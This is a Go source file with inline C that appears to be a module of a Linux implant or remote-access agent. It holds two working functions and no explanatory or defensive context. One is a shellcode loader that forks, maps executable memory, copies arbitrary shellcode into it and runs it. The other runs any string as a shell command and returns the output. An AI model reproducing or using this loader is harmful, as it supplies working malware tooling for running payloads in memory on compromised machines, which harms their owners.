//go:build linux && !debug

package modules

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void call(char *shellcode, size_t length) {
	if(fork()) {
		return;
	}
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, \
		PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED) {
		perror("mmap");
		return;
	}
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"os/exec"
	"unsafe"
)

func ShellcodeExec(sc []byte) {
	go C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
}

// Executes a command in shell and returns stdout
func Exec(cmd string) ([]byte, error) {
	command := exec.Command("/bin/sh", "-c", cmd)
	byteOut, err := command.CombinedOutput()
	if err != nil {
		return nil, err
	}
	return byteOut, nil
}
